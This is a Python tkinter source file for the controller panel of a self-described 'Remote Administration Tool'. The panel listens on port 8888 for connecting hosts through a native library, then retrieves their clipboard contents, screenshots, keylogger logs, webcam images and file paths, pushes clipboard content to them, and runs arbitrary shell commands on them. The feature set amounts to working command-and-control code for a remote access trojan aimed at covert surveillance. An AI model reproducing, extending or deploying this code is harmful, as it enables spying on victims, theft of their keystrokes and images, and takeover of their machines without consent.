import tkinter as tk
from tkinter import filedialog, scrolledtext, Canvas, Scrollbar, messagebox
from ctypes import CDLL, c_int, c_char_p
from threading import Thread
from PIL import Image, ImageTk
import base64
import io
import time
import socket

PORT = 8888
BUFFER_SIZE = 1024

# Load the shared library
connection_manager = CDLL('./connection_manager.so')

# Set the return type of the get_stored_ips function
connection_manager.get_stored_ips.restype = c_char_p
connection_manager.first_message.restype = c_char_p
connection_manager.second_message.restype = c_char_p
connection_manager.create_socket.argtypes = [c_char_p]
connection_manager.create_socket.restype = c_int
connection_manager.second_message_send_data.restype = c_char_p

# Create the main window
root = tk.Tk()
root.title("Remote Administration Tool")
root.geometry("800x500")

# Configure column weights
root.columnconfigure(0, weight=1)
root.columnconfigure(1, weight=1)
# root.columnconfigure(2, weight=1)

class ResultDialog(tk.Toplevel):
    def __init__(self, master, result, result_type):
        super().__init__(master)
        self.title("Result")
        self.geometry("500x300")

        self.button_frame = tk.Frame(self)
        self.button_frame.pack(side=tk.BOTTOM, fill=tk.X, pady=5)

        if result_type == 'text':
            self.result_text = scrolledtext.ScrolledText(self, wrap=tk.WORD)
            self.result_text.insert(tk.INSERT, result)
            self.result_text.configure(state='disabled')
            self.result_text.pack(expand=True, fill=tk.BOTH)
        elif result_type == 'image':
            self.result = result
            image_data = io.BytesIO(result)
            image = Image.open(image_data)
            self.image = ImageTk.PhotoImage(image)

            self.canvas_frame = tk.Frame(self)
            self.canvas_frame.pack(fill=tk.BOTH, expand=True)

            self.canvas = Canvas(self.canvas_frame, width=image.width, height=image.height)
            self.canvas.create_image(0, 0, anchor=tk.NW, image=self.image)

            self.scroll_x = Scrollbar(self.canvas_frame, orient="horizontal", command=self.canvas.xview)
            self.scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
            self.scroll_y = Scrollbar(self.canvas_frame, orient="vertical", command=self.canvas.yview)
            self.scroll_y.pack(side=tk.RIGHT, fill=tk.Y)

            self.canvas.configure(xscrollcommand=self.scroll_x.set, yscrollcommand=self.scroll_y.set)
            self.canvas.configure(scrollregion=self.canvas.bbox("all"))

            self.canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

            self.save_button = tk.Button(self.button_frame, text="Save", command=self.save_image)
            self.save_button.pack(side=tk.LEFT, padx=5)

        self.close_button = tk.Button(self.button_frame, text="Close", command=self.destroy)
        self.close_button.pack(side=tk.RIGHT, padx=5)

    def save_image(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".png",
                                                 filetypes=[("PNG files", "*.png"),
                                                            ("JPEG files", "*.jpg"),
                                                            ("All files", "*.*")])
        if file_path:
            with open(file_path, "wb") as f:
                f.write(self.result)

def accept_connections(server_fd):
    connection_manager.accept_connections(server_fd)

def start_listening():
    server_fd = connection_manager.create_server_socket()
    thread = Thread(target=accept_connections, args=(server_fd,))
    thread.daemon = True
    thread.start()

    return server_fd

def padding(response):
    padding_needed = 4 - len(response) % 4
    if padding_needed != 4:
        response += b"=" * padding_needed

    return response

def create_socket(action):
    selected_index = ip_listbox.curselection()
    if not selected_index:
        messagebox.showwarning("No IP selected", "Please select an IP address.")
        return
    selected_ip = ip_listbox.get(selected_index)
    # if selected_ip:
    sock = connection_manager.create_socket(selected_ip.encode('utf-8'))
    if action == 1:
        retrieve_clipboard(sock)
    elif action == 2:
        push_clipboard_text(sock)
    elif action == 3:
        push_clipboard_image(sock)
    elif action == 4:
        retrieve_screenshot(sock)
    elif action == 5:
        retrieve_keylogger(sock)
    elif action == 6:
        retrieve_webcam(sock)
    elif action == 7:
        retrieve_path(sock)
    elif action == 8:
        send_command_and_receive_output(sock)
    # else:
    #     result_dialog = ResultDialog(root, 'No IP selected', 'text')

def decode_message(mess):
    mess = padding(mess)
    mess = base64.b64decode(mess.decode('utf-8')).decode('utf-8')
    return mess

def first_message(sock, mess):
    response = connection_manager.first_message(sock, mess)
    response = decode_message(response)
    return response

def retrieve_clipboard(sock):
    response = first_message(sock, b'10')
    data_type = int(response[0])
    data_size = int(response[1:])

    clipboard_data = connection_manager.second_message(sock, data_size)
    if (data_type == 1):
        clipboard_data = decode_message(clipboard_data)
        result_dialog = ResultDialog(root, clipboard_data, 'text')
    else:
        clipboard_data = padding(clipboard_data)
        img_data = base64.b64decode(clipboard_data)
        result_dialog = ResultDialog(root, img_data, 'image')

def retrieve_screenshot(sock):
    response = first_message(sock, b'40')
    data_type = int(response[0])
    data_size = int(response[1:])

    img_data = connection_manager.second_message(sock, data_size)
    img_data = padding(img_data)
    img_data = base64.b64decode(img_data)
    result_dialog = ResultDialog(root, img_data, 'image')

def push_clipboard_text(sock):
    first_mess = '2' + str(len(clipboard_input.get()))
    clip_data = clipboard_input.get()
    connection_manager.first_message_send_data(sock, first_mess.encode('utf-8'), clip_data.encode('utf-8'))
    
def push_clipboard_image(sock):
    file_path = filedialog.askopenfilename(filetypes=[("Image files", "*.png;*.jpg;*.jpeg;*.bmp;*.gif")])
    if file_path:
        with open(file_path, 'rb') as f:
            image_data = f.read()
        image_data = base64.b64encode(image_data)
        first_mess = '3' + str(len(image_data))
        connection_manager.first_message_send_data(sock, first_mess.encode('utf-8'), image_data)

def retrieve_keylogger(sock):
    response = first_message(sock, b'50')
    data_type = int(response[0])
    data_size = int(response[1:])

    keylogger_data = connection_manager.second_message(sock, data_size)
    keylogger_data = decode_message(keylogger_data)
    with open('keylogger.txt', 'a') as f:
        f.write(keylogger_data)

def retrieve_webcam(sock):
    response = first_message(sock, b'60')
    data_type = int(response[0])
    data_size = int(response[1:])
    webcam_data = connection_manager.second_message(sock, data_size)
    webcam_data = padding(webcam_data)
    webcam_data = base64.b64decode(webcam_data)
    result_dialog = ResultDialog(root, webcam_data, 'image')

def retrieve_path(sock):
    response = first_message(sock, b'70')
    data_type = int(response[0])
    data_size = int(response[1:])
    path_data = connection_manager.second_message(sock, data_size)
    path_data = decode_message(path_data)
    result_dialog = ResultDialog(root, path_data, 'text')

def send_command_and_receive_output(sock):
    first_mess = '8' + str(len(command_input.get()))
    command = command_input.get()
    connection_manager.first_message_send_data(sock, first_mess.encode('utf-8'), command.encode('utf-8'))
    response = connection_manager.second_message_send_data(sock)
    response = decode_message(response)
    data_type = int(response[0])
    data_size = int(response[1:])
    command_output = connection_manager.second_message(sock, data_size)
    command_output = decode_message(command_output)
    result_dialog = ResultDialog(root, command_output, 'text')    

# Start listening for connections
server_fd = start_listening()

existing_ips = set()

# IP selection and clipboard retrieval
selected_ip = None

# Create the IP Listbox
ip_listbox = tk.Listbox(root, selectmode=tk.SINGLE)
ip_listbox.grid(column=0, row=1, rowspan=11, sticky='nsew')

# Update IP Listbox
def update_ip_buttons():
    ip_list = connection_manager.get_stored_ips()
    ip_list = ip_list.decode("utf-8")
    ips = ip_list.strip().split(',')

    for ip in ips:
        if ip and ip not in existing_ips:
            existing_ips.add(ip)
            ip_listbox.insert(tk.END, ip)

# Update IPs
def update_ips():
    while True:
        update_ip_buttons()
        time.sleep(5)
    while True:
        update_ip_buttons()
        time.sleep(5)

# Start the IP address update thread
update_thread = Thread(target=update_ips)
update_thread.daemon = True
update_thread.start()

# Create column headers
ip_header = tk.Label(root, text="IPs")
ip_header.grid(column=0, row=0, sticky='ew')

actions_header = tk.Label(root, text="Actions")
actions_header.grid(column=1, row=0, sticky='ew')

# Create the clipboard button
clipboard_button = tk.Button(root, text="Clipboard", command=lambda: create_socket(1))
clipboard_button.grid(column=1, row=1, sticky='ew')

# Create the push text clipboard button
push_clipboard_button_text = tk.Button(root, text="Push clipboard text", command=lambda: create_socket(2))
push_clipboard_button_text.grid(column=1, row=2, sticky='ew')
# Create the input field for the push clipboard action
clipboard_input = tk.Entry(root)
clipboard_input.grid(column=1, row=3, sticky='ew')

# Create the push image clipboard button
push_clipboard_button_image = tk.Button(root, text="Push clipboard image", command=lambda: create_socket(3))
push_clipboard_button_image.grid(column=1, row=4, sticky='ew')

# Create the screenshot button
screenshot_button = tk.Button(root, text="Screenshot", command=lambda: create_socket(4))
screenshot_button.grid(column=1, row=6, sticky='ew')

# Create the keylogger button
keylogger_button = tk.Button(root, text="Keylogger", command=lambda: create_socket(5))
keylogger_button.grid(column=1, row=7, sticky='ew')

webcam_button = tk.Button(root, text="Webcam", command=lambda: create_socket(6))
webcam_button.grid(column=1, row=8, sticky='ew')

path_button = tk.Button(root, text="Path", command=lambda: create_socket(7))
path_button.grid(column=1, row=9, sticky='ew')

shell_button = tk.Button(root, text="Command", command=lambda: create_socket(8))
shell_button.grid(column=1, row=10, sticky='ew')
command_input = tk.Entry(root)
command_input.grid(column=1, row=11, sticky='ew')

root.mainloop()
